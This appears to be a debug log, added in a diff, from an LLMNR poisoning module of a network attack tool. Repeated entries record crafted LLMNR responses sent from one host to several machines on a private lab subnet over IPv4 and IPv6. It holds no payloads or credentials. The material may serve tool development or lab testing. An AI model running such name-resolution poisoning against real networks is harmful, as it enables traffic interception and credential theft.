+2022-01-19 17:45:47.571 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:50038 / LLMNRResponse
+2022-01-19 17:45:47.571 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:45:47.603 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:45:47.604 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:50038 / LLMNRResponse
+2022-01-19 17:45:47.604 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.139[0m
+2022-01-19 17:47:16.517 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:47:16.518 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2022-01-19 17:47:16.518 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-19 17:49:24.254 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:49:24.255 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2022-01-19 17:49:24.255 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-19 17:59:28.577 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:59:28.578 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2022-01-19 17:59:28.578 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-19 17:59:29.065 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:59:29.068 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:54757 / LLMNRResponse
+2022-01-19 17:59:29.068 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::e402:9b1f:9ad8:43cc[0m
+2022-01-19 17:59:29.180 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:59:29.182 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:54757 / LLMNRResponse
+2022-01-19 17:59:29.182 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.137[0m
+2022-01-19 17:59:31.636 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:59:31.637 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:65535 / LLMNRResponse
+2022-01-19 17:59:31.637 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::e402:9b1f:9ad8:43cc[0m
+2022-01-19 17:59:31.677 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:59:31.678 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:65535 / LLMNRResponse
+2022-01-19 17:59:31.678 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.137[0m
+2022-01-19 18:14:29.177 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:14:29.177 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:57240 / LLMNRResponse
+2022-01-19 18:14:29.177 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::e402:9b1f:9ad8:43cc[0m
+2022-01-19 18:14:29.212 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:14:29.213 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:57240 / LLMNRResponse
+2022-01-19 18:14:29.213 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.137[0m
+2022-01-19 18:14:30.207 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:14:30.208 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:54780 / LLMNRResponse
+2022-01-19 18:14:30.213 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:14:30.214 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:54780 / LLMNRResponse
+2022-01-19 18:14:30.624 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:14:30.624 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:54780 / LLMNRResponse
+2022-01-19 18:14:30.625 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::e402:9b1f:9ad8:43cc[0m
+2022-01-19 18:14:30.661 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:14:30.661 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:54780 / LLMNRResponse
+2022-01-19 18:14:30.662 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.137[0m
+2022-01-19 18:29:29.194 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:29:29.195 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:52747 / LLMNRResponse
+2022-01-19 18:29:29.195 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::e402:9b1f:9ad8:43cc[0m
+2022-01-19 18:29:29.236 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:29:29.237 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:52747 / LLMNRResponse
+2022-01-19 18:29:29.237 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.137[0m
+2022-01-19 18:29:30.201 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:29:30.202 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:65535 / LLMNRResponse
+2022-01-19 18:29:30.204 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:29:30.204 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:65535 / LLMNRResponse
+2022-01-19 18:29:30.623 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:29:30.625 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:65535 / LLMNRResponse
+2022-01-19 18:29:30.630 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:29:30.632 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:65535 / LLMNRResponse
+2022-01-19 18:44:29.227 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:44:29.228 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:50290 / LLMNRResponse
+2022-01-19 18:44:29.228 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::e402:9b1f:9ad8:43cc[0m
+2022-01-19 18:44:29.265 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:44:29.266 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:50290 / LLMNRResponse
+2022-01-19 18:44:29.267 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.137[0m
+2022-01-19 18:44:30.252 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:44:30.254 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:57270 / LLMNRResponse
+2022-01-19 18:44:30.259 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:44:30.261 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:57270 / LLMNRResponse
+2022-01-19 18:44:30.676 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:44:30.678 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:57270 / LLMNRResponse
+2022-01-19 18:44:30.683 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 18:44:30.685 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:57270 / LLMNRResponse
